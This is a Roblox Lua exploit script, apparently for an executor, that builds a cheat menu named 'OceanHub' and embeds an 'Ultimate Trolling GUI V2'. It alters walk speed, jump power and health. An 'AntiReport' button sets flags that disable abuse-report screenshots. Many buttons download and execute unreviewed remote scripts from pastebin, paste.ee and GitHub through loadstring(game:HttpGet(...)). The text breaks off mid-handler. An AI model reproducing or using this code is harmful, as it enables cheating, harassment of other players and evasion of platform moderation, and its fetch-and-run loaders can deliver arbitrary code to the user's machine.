local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("OceanHub", BloodTheme)
wait(2) 
local function callback(Text)
 if Text == "Ok" then
  print ("Answer")
elseif Text == ("Ok") then
 print ("Answer2")
 end
end
local NotificationBindable = Instance.new("BindableFunction")
NotificationBindable.OnInvoke = callback
--
game.StarterGui:SetCore("SendNotification",  {
 Title = "Success";
 Text = "Ocean Hub had success loading!";
 Icon = "";
 Duration = 5;
 Button1 = "thank god";
 Button2 = "thank god";
 Callback = NotificationBindable;
})
-- Tabs

local Tab1 = Window:NewTab("Main")
local Tab1Section = Tab1:NewSection("Main Section")
local Tab2 = Window:NewTab("Others")
local Tab2Section = Tab2:NewSection("Tests")
local Tab3 = Window:NewTab("Scripts")
local Tab3Section = Tab3:NewSection("Scripts")
-- Buttons/Windows/Idk

Tab1Section:NewButton("Infinite Jumps", "Allows you to jump infinitely.", function()
    local InfiniteJumpEnabled = true
game:GetService("UserInputService").JumpRequest:connect(function()
	if InfiniteJumpEnabled then
		game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
	end
end)
end)

Tab1Section:NewToggle("FOV", "Changes your FOV", function(state)
    if state then
        game.Workspace.CurrentCamera.FieldOfView = 120
    else
        game.Workspace.CurrentCamera.FieldOfView = 80
    end
end)

Tab1Section:NewSlider("Speed", "Changes your speed.", 250, 8, function(v)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = v
end)
Tab1Section:NewSlider("JumpPower", "Changes your JumpPower", 1000, 0, function(j) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = j
end)
Tab1Section:NewSlider("Health", "Changes your health", 100, 0, function(h) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.Health = h
end)
Tab1Section:NewKeybind("Keybind", "Sets a keybind to open and close", Enum.KeyCode.F, function()
	Library:ToggleUI()
end)
Tab2Section:NewTextBox("Typing Test", "Test some of your keys on your keyboard", function(txt)
	print(txt)
end)
Tab2Section:NewSlider("MouseHold Test", "Test if your mouse allows holding the Left Click", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Delete = s
end)
Tab2Section:NewToggle("Test click speed", "This allows you to test your ClickSpeed or the Mouse Speed", function(state)
    if state then
        print("Clicked!")
    else
        print("Test")
end
end)
Tab3Section:NewButton("c00lgui Script", "Opens the CG Script", function(f)
loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)()
end)
Tab3Section:NewButton("UTG", "Opens the UTG Script", function(UTG)
 local function callback(Text)
 if Text == "Button1 text" then
  print ("Answer")
elseif Text == ("Button2 text") then
 print ("Answer2")
 end
end

local NotificationBindable = Instance.new("BindableFunction")
NotificationBindable.OnInvoke = callback
--
game.StarterGui:SetCore("SendNotification",  {
 Title = "UTG V2";
 Text = "UTG V2 has succesfully loaded :D";
 Icon = "";
 Duration = 5;
 Button1 = "Ok";
 Button2 = "Ok";
 Callback = NotificationBindable;
})
-- Gui to Lua
-- Version: 3.2

-- Instances:

local UTG_V2 = Instance.new("ScreenGui")
local Main = Instance.new("Frame")
local UIGradient = Instance.new("UIGradient")
local UICorner = Instance.new("UICorner")
local Title = Instance.new("TextLabel")
local SubTitile = Instance.new("TextLabel")
local Welcome = Instance.new("TextLabel")
local UICorner_2 = Instance.new("UICorner")
local Credits = Instance.new("TextLabel")
local UICorner_3 = Instance.new("UICorner")
local OptionListFrame = Instance.new("Frame")
local OptionList = Instance.new("ScrollingFrame")
local Sonic = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local Gale = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local Among_Us = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local Killbot = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local NekoMaid = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local Smug = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local ShadowBlade = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local SwordStand = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local Neptunion = Instance.new("TextButton")
local UICorner_12 = Instance.new("UICorner")
local RbNeptunion = Instance.new("TextButton")
local UICorner_13 = Instance.new("UICorner")
local Wall = Instance.new("TextButton")
local UICorner_14 = Instance.new("UICorner")
local achroGlicher = Instance.new("TextButton")
local UICorner_15 = Instance.new("UICorner")
local FlamingCube = Instance.new("TextButton")
local UICorner_16 = Instance.new("UICorner")
local Spider = Instance.new("TextButton")
local UICorner_17 = Instance.new("UICorner")
local Cop = Instance.new("TextButton")
local UICorner_18 = Instance.new("UICorner")
local Chips = Instance.new("TextButton")
local UICorner_19 = Instance.new("UICorner")
local Joy = Instance.new("TextButton")
local UICorner_20 = Instance.new("UICorner")
local UMD = Instance.new("TextButton")
local UICorner_21 = Instance.new("UICorner")
local Chill = Instance.new("TextButton")
local UICorner_22 = Instance.new("UICorner")
local Grapple = Instance.new("TextButton")
local UICorner_23 = Instance.new("UICorner")
local ServerAdmin = Instance.new("TextButton")
local UICorner_24 = Instance.new("UICorner")
local Ender = Instance.new("TextButton")
local UICorner_25 = Instance.new("UICorner")
local Ban = Instance.new("TextButton")
local UICorner_26 = Instance.new("UICorner")
local Netless = Instance.new("TextButton")
local UICorner_27 = Instance.new("UICorner")
local Shadow = Instance.new("Frame")
local UICorner_28 = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local AntiReport = Instance.new("TextButton")
local UICorner_29 = Instance.new("UICorner")
local Shadow_2 = Instance.new("Frame")
local UICorner_30 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")
local X = Instance.new("TextButton")
local UICorner_31 = Instance.new("UICorner")
local OpenUTG = Instance.new("TextButton")

--Properties:

UTG_V2.Name = "UTG_V2"
UTG_V2.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
UTG_V2.ResetOnSpawn = false

Main.Name = "Main"
Main.Parent = UTG_V2
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main.BorderColor3 = Color3.fromRGB(27, 42, 53)
Main.BorderSizePixel = 0
Main.Position = UDim2.new(0.0592107326, 0, 0.0301492307, 0)
Main.Size = UDim2.new(0, 451, 0, 534)

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(137, 0, 254)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(223, 0, 255))}
UIGradient.Parent = Main

UICorner.CornerRadius = UDim.new(0, 5)
UICorner.Parent = Main

Title.Name = "Title"
Title.Parent = Main
Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundTransparency = 1.000
Title.Position = UDim2.new(0.0711524412, 0, -0.00186577276, 0)
Title.Size = UDim2.new(0, 385, 0, 54)
Title.Font = Enum.Font.SourceSans
Title.Text = "ULTIMATE TROLLING GUI V2"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextScaled = true
Title.TextSize = 38.000
Title.TextWrapped = true

SubTitile.Name = "SubTitile"
SubTitile.Parent = Title
SubTitile.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SubTitile.BackgroundTransparency = 1.000
SubTitile.Position = UDim2.new(-0.285957217, 0, 0.388888925, 0)
SubTitile.Size = UDim2.new(0, 611, 0, 54)
SubTitile.Font = Enum.Font.SourceSans
SubTitile.Text = "FE UTG is back! And is now V2! Thx for using! :)"
SubTitile.TextColor3 = Color3.fromRGB(255, 255, 255)
SubTitile.TextSize = 20.000

Welcome.Name = "Welcome"
Welcome.Parent = Main
Welcome.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Welcome.Position = UDim2.new(0.0505445786, 0, 0.114676468, 0)
Welcome.Size = UDim2.new(0, 403, 0, 36)
Welcome.Font = Enum.Font.SourceSansBold
Welcome.Text = "Welcome to the brand new FE UTG! Made by Bulkez"
Welcome.TextColor3 = Color3.fromRGB(0, 0, 0)
Welcome.TextScaled = true
Welcome.TextSize = 14.000
Welcome.TextWrapped = true

UICorner_2.Parent = Welcome

Credits.Name = "Credits"
Credits.Parent = Main
Credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Credits.Position = UDim2.new(0.0527422242, 0, 0.772552848, 0)
Credits.Size = UDim2.new(0, 405, 0, 44)
Credits.Font = Enum.Font.SourceSansBold
Credits.Text = "Made by Blukez also credit to the original script creators also thx FO10 :)"
Credits.TextColor3 = Color3.fromRGB(0, 0, 0)
Credits.TextScaled = true
Credits.TextSize = 14.000
Credits.TextWrapped = true

UICorner_3.Parent = Credits

OptionListFrame.Name = "OptionListFrame"
OptionListFrame.Parent = Main
OptionListFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OptionListFrame.BackgroundTransparency = 1.000
OptionListFrame.Position = UDim2.new(0.0279720332, 0, 0.191011235, 0)
OptionListFrame.Size = UDim2.new(0, 403, 0, 711)

OptionList.Name = "OptionList"
OptionList.Parent = OptionListFrame
OptionList.Active = true
OptionList.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OptionList.Position = UDim2.new(0.0351866931, 0, 0.00994348992, 0)
OptionList.Size = UDim2.new(0, 402, 0, 296)

Sonic.Name = "Sonic"
Sonic.Parent = OptionList
Sonic.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
Sonic.Position = UDim2.new(0.0231197979, 0, 0.00696475245, 0)
Sonic.Size = UDim2.new(0, 370, 0, 50)
Sonic.Font = Enum.Font.SourceSans
Sonic.Text = "Sonic"
Sonic.TextColor3 = Color3.fromRGB(255, 255, 255)
Sonic.TextScaled = true
Sonic.TextSize = 14.000
Sonic.TextWrapped = true

UICorner_4.Parent = Sonic

Gale.Name = "Gale"
Gale.Parent = OptionList
Gale.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
Gale.Position = UDim2.new(0.0231197979, 0, 0.0506699458, 0)
Gale.Size = UDim2.new(0, 370, 0, 50)
Gale.Font = Enum.Font.SourceSans
Gale.Text = "Gale"
Gale.TextColor3 = Color3.fromRGB(255, 255, 255)
Gale.TextScaled = true
Gale.TextSize = 14.000
Gale.TextWrapped = true

UICorner_5.Parent = Gale

Among_Us.Name = "Among_Us"
Among_Us.Parent = OptionList
Among_Us.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
Among_Us.Position = UDim2.new(0.0231197979, 0, 0.092793569, 0)
Among_Us.Size = UDim2.new(0, 370, 0, 50)
Among_Us.Font = Enum.Font.SourceSans
Among_Us.Text = "Among us"
Among_Us.TextColor3 = Color3.fromRGB(255, 255, 255)
Among_Us.TextScaled = true
Among_Us.TextSize = 14.000
Among_Us.TextWrapped = true

UICorner_6.Parent = Among_Us

Killbot.Name = "Killbot"
Killbot.Parent = OptionList
Killbot.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
Killbot.Position = UDim2.new(0.0231197979, 0, 0.1349172, 0)
Killbot.Size = UDim2.new(0, 370, 0, 50)
Killbot.Font = Enum.Font.SourceSans
Killbot.Text = "Killbot"
Killbot.TextColor3 = Color3.fromRGB(255, 255, 255)
Killbot.TextScaled = true
Killbot.TextSize = 14.000
Killbot.TextWrapped = true

UICorner_7.Parent = Killbot

NekoMaid.Name = "NekoMaid"
NekoMaid.Parent = OptionList
NekoMaid.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
NekoMaid.Position = UDim2.new(0.0231197979, 0, 0.177534401, 0)
NekoMaid.Size = UDim2.new(0, 370, 0, 50)
NekoMaid.Font = Enum.Font.SourceSans
NekoMaid.Text = "Neko Maid"
NekoMaid.TextColor3 = Color3.fromRGB(255, 255, 255)
NekoMaid.TextScaled = true
NekoMaid.TextSize = 14.000
NekoMaid.TextWrapped = true

UICorner_8.Parent = NekoMaid

Smug.Name = "Smug"
Smug.Parent = OptionList
Smug.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
Smug.Position = UDim2.new(0.0231197979, 0, 0.22079052, 0)
Smug.Size = UDim2.new(0, 370, 0, 50)
Smug.Font = Enum.Font.SourceSans
Smug.Text = "Smug Dance V6"
Smug.TextColor3 = Color3.fromRGB(255, 255, 255)
Smug.TextScaled = true
Smug.TextSize = 14.000
Smug.TextWrapped = true

UICorner_9.Parent = Smug

ShadowBlade.Name = "ShadowBlade"
ShadowBlade.Parent = OptionList
ShadowBlade.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
ShadowBlade.Position = UDim2.new(0.0231197979, 0, 0.263522238, 0)
ShadowBlade.Size = UDim2.new(0, 370, 0, 50)
ShadowBlade.Font = Enum.Font.SourceSans
ShadowBlade.Text = "Shadow Blade"
ShadowBlade.TextColor3 = Color3.fromRGB(255, 255, 255)
ShadowBlade.TextScaled = true
ShadowBlade.TextSize = 14.000
ShadowBlade.TextWrapped = true

UICorner_10.Parent = ShadowBlade

SwordStand.Name = "SwordStand"
SwordStand.Parent = OptionList
SwordStand.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
SwordStand.Position = UDim2.new(0.0231197979, 0, 0.304071069, 0)
SwordStand.Size = UDim2.new(0, 370, 0, 50)
SwordStand.Font = Enum.Font.SourceSans
SwordStand.Text = "Sword Stand"
SwordStand.TextColor3 = Color3.fromRGB(255, 255, 255)
SwordStand.TextScaled = true
SwordStand.TextSize = 14.000
SwordStand.TextWrapped = true

UICorner_11.Parent = SwordStand

Neptunion.Name = "Neptunion"
Neptunion.Parent = OptionList
Neptunion.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
Neptunion.Position = UDim2.new(0.0231197979, 0, 0.347187638, 0)
Neptunion.Size = UDim2.new(0, 370, 0, 50)
Neptunion.Font = Enum.Font.SourceSans
Neptunion.Text = "Neptunion V"
Neptunion.TextColor3 = Color3.fromRGB(255, 255, 255)
Neptunion.TextScaled = true
Neptunion.TextSize = 14.000
Neptunion.TextWrapped = true

UICorner_12.Parent = Neptunion

RbNeptunion.Name = "RbNeptunion"
RbNeptunion.Parent = OptionList
RbNeptunion.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
RbNeptunion.Position = UDim2.new(0.0231197979, 0, 0.390972137, 0)
RbNeptunion.Size = UDim2.new(0, 370, 0, 50)
RbNeptunion.Font = Enum.Font.SourceSans
RbNeptunion.Text = "RB Neptunion"
RbNeptunion.TextColor3 = Color3.fromRGB(255, 255, 255)
RbNeptunion.TextScaled = true
RbNeptunion.TextSize = 14.000
RbNeptunion.TextWrapped = true

UICorner_13.Parent = RbNeptunion

Wall.Name = "Wall"
Wall.Parent = OptionList
Wall.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
Wall.Position = UDim2.new(0.0231197979, 0, 0.434192657, 0)
Wall.Size = UDim2.new(0, 370, 0, 50)
Wall.Font = Enum.Font.SourceSans
Wall.Text = "Wall"
Wall.TextColor3 = Color3.fromRGB(255, 255, 255)
Wall.TextScaled = true
Wall.TextSize = 14.000
Wall.TextWrapped = true

UICorner_14.Parent = Wall

achroGlicher.Name = "achroGlicher"
achroGlicher.Parent = OptionList
achroGlicher.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
achroGlicher.Position = UDim2.new(0.0231197979, 0, 0.47801882, 0)
achroGlicher.Size = UDim2.new(0, 370, 0, 50)
achroGlicher.Font = Enum.Font.SourceSans
achroGlicher.Text = "Achromatic Glicher"
achroGlicher.TextColor3 = Color3.fromRGB(255, 255, 255)
achroGlicher.TextScaled = true
achroGlicher.TextSize = 14.000
achroGlicher.TextWrapped = true

UICorner_15.Parent = achroGlicher

FlamingCube.Name = "FlamingCube"
FlamingCube.Parent = OptionList
FlamingCube.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
FlamingCube.Position = UDim2.new(0.0231197979, 0, 0.521497488, 0)
FlamingCube.Size = UDim2.new(0, 370, 0, 50)
FlamingCube.Font = Enum.Font.SourceSans
FlamingCube.Text = "Flaming Cube"
FlamingCube.TextColor3 = Color3.fromRGB(255, 255, 255)
FlamingCube.TextScaled = true
FlamingCube.TextSize = 14.000
FlamingCube.TextWrapped = true

UICorner_16.Parent = FlamingCube

Spider.Name = "Spider"
Spider.Parent = OptionList
Spider.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
Spider.Position = UDim2.new(0.0231197979, 0, 0.564180851, 0)
Spider.Size = UDim2.new(0, 370, 0, 50)
Spider.Font = Enum.Font.SourceSans
Spider.Text = "Spider"
Spider.TextColor3 = Color3.fromRGB(255, 255, 255)
Spider.TextScaled = true
Spider.TextSize = 14.000
Spider.TextWrapped = true

UICorner_17.Parent = Spider

Cop.Name = "Cop"
Cop.Parent = OptionList
Cop.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
Cop.Position = UDim2.new(0.0231197979, 0, 0.606966078, 0)
Cop.Size = UDim2.new(0, 370, 0, 50)
Cop.Font = Enum.Font.SourceSans
Cop.Text = "Cop"
Cop.TextColor3 = Color3.fromRGB(255, 255, 255)
Cop.TextScaled = true
Cop.TextSize = 14.000
Cop.TextWrapped = true

UICorner_18.Parent = Cop

Chips.Name = "Chips"
Chips.Parent = OptionList
Chips.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
Chips.Position = UDim2.new(0.0231197979, 0, 0.649766564, 0)
Chips.Size = UDim2.new(0, 370, 0, 50)
Chips.Font = Enum.Font.SourceSans
Chips.Text = "Chips"
Chips.TextColor3 = Color3.fromRGB(255, 255, 255)
Chips.TextScaled = true
Chips.TextSize = 14.000
Chips.TextWrapped = true

UICorner_19.Parent = Chips

Joy.Name = "Joy"
Joy.Parent = OptionList
Joy.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
Joy.Position = UDim2.new(0.0231197979, 0, 0.69195044, 0)
Joy.Size = UDim2.new(0, 370, 0, 50)
Joy.Font = Enum.Font.SourceSans
Joy.Text = ":Joy:"
Joy.TextColor3 = Color3.fromRGB(255, 255, 255)
Joy.TextScaled = true
Joy.TextSize = 14.000
Joy.TextWrapped = true

UICorner_20.Parent = Joy

UMD.Name = "UMD"
UMD.Parent = OptionList
UMD.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
UMD.Position = UDim2.new(0.0231197979, 0, 0.732523978, 0)
UMD.Size = UDim2.new(0, 370, 0, 50)
UMD.Font = Enum.Font.SourceSans
UMD.Text = "Ultimate meme dance"
UMD.TextColor3 = Color3.fromRGB(255, 255, 255)
UMD.TextScaled = true
UMD.TextSize = 14.000
UMD.TextWrapped = true

UICorner_21.Parent = UMD

Chill.Name = "Chill"
Chill.Parent = OptionList
Chill.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
Chill.Position = UDim2.new(0.0231197979, 0, 0.772394419, 0)
Chill.Size = UDim2.new(0, 370, 0, 50)
Chill.Font = Enum.Font.SourceSans
Chill.Text = "Chill"
Chill.TextColor3 = Color3.fromRGB(255, 255, 255)
Chill.TextScaled = true
Chill.TextSize = 14.000
Chill.TextWrapped = true

UICorner_22.Parent = Chill

Grapple.Name = "Grapple"
Grapple.Parent = OptionList
Grapple.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
Grapple.Position = UDim2.new(0.0231197979, 0, 0.815179646, 0)
Grapple.Size = UDim2.new(0, 370, 0, 50)
Grapple.Font = Enum.Font.SourceSans
Grapple.Text = "Grapple"
Grapple.TextColor3 = Color3.fromRGB(255, 255, 255)
Grapple.TextScaled = true
Grapple.TextSize = 14.000
Grapple.TextWrapped = true

UICorner_23.Parent = Grapple

ServerAdmin.Name = "ServerAdmin"
ServerAdmin.Parent = OptionList
ServerAdmin.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
ServerAdmin.Position = UDim2.new(0.0231197979, 0, 0.858780205, 0)
ServerAdmin.Size = UDim2.new(0, 370, 0, 50)
ServerAdmin.Font = Enum.Font.SourceSans
ServerAdmin.Text = "Server Admin"
ServerAdmin.TextColor3 = Color3.fromRGB(255, 255, 255)
ServerAdmin.TextScaled = true
ServerAdmin.TextSize = 14.000
ServerAdmin.TextWrapped = true

UICorner_24.Parent = ServerAdmin

Ender.Name = "Ender"
Ender.Parent = OptionList
Ender.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
Ender.Position = UDim2.new(0.0231197979, 0, 0.902380705, 0)
Ender.Size = UDim2.new(0, 370, 0, 50)
Ender.Font = Enum.Font.SourceSans
Ender.Text = "Ender"
Ender.TextColor3 = Color3.fromRGB(255, 255, 255)
Ender.TextScaled = true
Ender.TextSize = 14.000
Ender.TextWrapped = true

UICorner_25.Parent = Ender

Ban.Name = "Ban"
Ban.Parent = OptionList
Ban.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
Ban.Position = UDim2.new(0.0231197979, 0, 0.945981264, 0)
Ban.Size = UDim2.new(0, 370, 0, 50)
Ban.Font = Enum.Font.SourceSans
Ban.Text = "Ban Hammer"
Ban.TextColor3 = Color3.fromRGB(255, 255, 255)
Ban.TextScaled = true
Ban.TextSize = 14.000
Ban.TextWrapped = true

UICorner_26.Parent = Ban

Netless.Name = "Netless"
Netless.Parent = Main
Netless.BackgroundColor3 = Color3.fromRGB(77, 156, 115)
Netless.BorderSizePixel = 0
Netless.Position = UDim2.new(0.51807934, 0, 0.868913829, 0)
Netless.Size = UDim2.new(0, 195, 0, 57)
Netless.ZIndex = 2
Netless.Font = Enum.Font.GothamSemibold
Netless.Text = ""
Netless.TextColor3 = Color3.fromRGB(255, 255, 255)
Netless.TextScaled = true
Netless.TextSize = 14.000
Netless.TextWrapped = true

UICorner_27.Parent = Netless

Shadow.Name = "Shadow"
Shadow.Parent = Netless
Shadow.BackgroundColor3 = Color3.fromRGB(58, 118, 86)
Shadow.BorderSizePixel = 0
Shadow.Size = UDim2.new(1, 0, 1, 4)

UICorner_28.Parent = Shadow

TextLabel.Parent = Netless
TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.5, 0, 0.49999997, 0)
TextLabel.Size = UDim2.new(1, -20, 1, -20)
TextLabel.ZIndex = 2
TextLabel.Font = Enum.Font.GothamSemibold
TextLabel.Text = "Netless (Use AFTER any scripts)"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

AntiReport.Name = "AntiReport"
AntiReport.Parent = Main
AntiReport.BackgroundColor3 = Color3.fromRGB(77, 156, 115)
AntiReport.BorderSizePixel = 0
AntiReport.Position = UDim2.new(0.0489794947, 0, 0.868913829, 0)
AntiReport.Size = UDim2.new(0, 197, 0, 57)
AntiReport.ZIndex = 2
AntiReport.Font = Enum.Font.GothamSemibold
AntiReport.Text = ""
AntiReport.TextColor3 = Color3.fromRGB(255, 255, 255)
AntiReport.TextScaled = true
AntiReport.TextSize = 14.000
AntiReport.TextWrapped = true

UICorner_29.Parent = AntiReport

Shadow_2.Name = "Shadow"
Shadow_2.Parent = AntiReport
Shadow_2.BackgroundColor3 = Color3.fromRGB(58, 118, 86)
Shadow_2.BorderSizePixel = 0
Shadow_2.Size = UDim2.new(1, 0, 1, 4)

UICorner_30.Parent = Shadow_2

TextLabel_2.Parent = AntiReport
TextLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.5, 0, 0.5, 0)
TextLabel_2.Size = UDim2.new(1, -20, 1, -20)
TextLabel_2.ZIndex = 2
TextLabel_2.Font = Enum.Font.GothamSemibold
TextLabel_2.Text = "AntiReport"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

X.Name = "X"
X.Parent = Main
X.BackgroundColor3 = Color3.fromRGB(251, 98, 92)
X.BorderSizePixel = 0
X.Position = UDim2.new(0.927937925, 0, -0.0262172297, 0)
X.Size = UDim2.new(0, 47, 0, 45)
X.ZIndex = 2
X.Font = Enum.Font.GothamSemibold
X.Text = "X"
X.TextColor3 = Color3.fromRGB(255, 255, 255)
X.TextSize = 32.000
X.TextWrapped = true

UICorner_31.CornerRadius = UDim.new(1, 0)
UICorner_31.Parent = X

OpenUTG.Name = "OpenUTG"
OpenUTG.Parent = UTG_V2
OpenUTG.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
OpenUTG.BackgroundTransparency = 1.000
OpenUTG.Position = UDim2.new(0.79603678, 0, 0.698529005, 0)
OpenUTG.Size = UDim2.new(0, 165, 0, 62)
OpenUTG.Visible = false
OpenUTG.Font = Enum.Font.SourceSans
OpenUTG.Text = "Open UTG"
OpenUTG.TextColor3 = Color3.fromRGB(255, 255, 255)
OpenUTG.TextScaled = true
OpenUTG.TextSize = 14.000
OpenUTG.TextWrapped = true

-- Scripts:

local function MBUQEV_fake_script() -- Main.DraggableScript 
    local script = Instance.new('LocalScript', Main)

    local UIS = game:GetService('UserInputService')
    local frame = script.Parent
    local dragToggle = nil
    local dragSpeed = 0.25
    local dragStart = nil
    local startPos = nil
    
    local function updateInput(input)
        local delta = input.Position - dragStart
        local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
            startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
    end
    
    frame.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
            dragToggle = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragToggle = false
                end
            end)
        end
    end)
    
    UIS.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            if dragToggle then
                updateInput(input)
            end
        end
    end)
    
end
coroutine.wrap(MBUQEV_fake_script)()
local function NWAVVF_fake_script() -- Netless.NetlessScript 
    local script = Instance.new('LocalScript', Netless)

    script.Parent.MouseButton1Click:Connect(function()
        for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
            if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
                game:GetService("RunService").Heartbeat:connect(function()
                    v.Velocity = Vector3.new(0,35,0)
                    wait(0.5)
                end)
            end
        end
    
        game:GetService("StarterGui"):SetCore("SendNotification", { 
            Title = "Notification";
            Text = "Netless activated";
            Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
        Duration = 16;
    end)
end
coroutine.wrap(NWAVVF_fake_script)()
local function WSBO_fake_script() -- X.CloseUTGScript 
    local script = Instance.new('LocalScript', X)

    script.Parent.MouseButton1Click:Connect(function()
        script.Parent.Parent.Parent.Main.Visible = false
        script.Parent.Parent.Parent.OpenUTG.Visible = true
    end)
end
coroutine.wrap(WSBO_fake_script)()
local function KZZCO_fake_script() -- OpenUTG.OpenUTGScript 
    local script = Instance.new('LocalScript', OpenUTG)

    script.Parent.MouseButton1Click:Connect(function()
        script.Parent.Parent.Main.Visible = true
        script.Parent.Visible = false
    end)
end
coroutine.wrap(KZZCO_fake_script)()

AntiReport.MouseButton1Click:Connect(function()
setfflag("AbuseReportScreenshotPercentage", 0)
setfflag("DFFlagAbuseReportScreenshot", "False")
print("Anti-Report loaded")
end)

Among_Us.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/JXUMavf3", true))()
end)

Ban.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/killermaster9999mega/thing/main/README.md"))()
end)

Chill.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync("https://pastebin.com/raw/XmHFdTij"))()
end)

Chips.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync("https://pastebin.com/raw/b289ts36"))()
end)

Cop.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync("https://pastebin.com/raw/VAA5Mf60"))()
end)

Ender.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync("https://pastebin.com/raw/bndCgupK"))()
end)

FlamingCube.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastebin.com/raw/D7pigANg"))()
end)

Gale.MouseButton1Click:Connect(function()
loadstring(game:HttpGet(("https://pastebin.com/raw/PjJNLaFa"), true))()
end)

Grapple.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync("https://pastebin.com/raw/AyASkDEG"))()
end)

Joy.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync("https://pastebin.com/raw/LEAQuKj0"))()
end)

Killbot.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync("https://pastebin.com/raw/G24tcRXA"))()
end)

NekoMaid.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync("https://paste.ee/d/6bCwm/0"))()
end)

Neptunion.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync("https://pastebin.com/raw/t0Mkc33N"))()
end)

RbNeptunion.MouseButton1Click:Connect(function()
loadstring(game:HttpGetAsync("https://pastebin.com/raw/gDi503fB"))()
end)

ServerAdmin.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ONEReverseCard/My-Scripts/main/Netless%20Server%20Admin.md"))()
end)

ShadowBlade.MouseButton1Click:Connect(function()
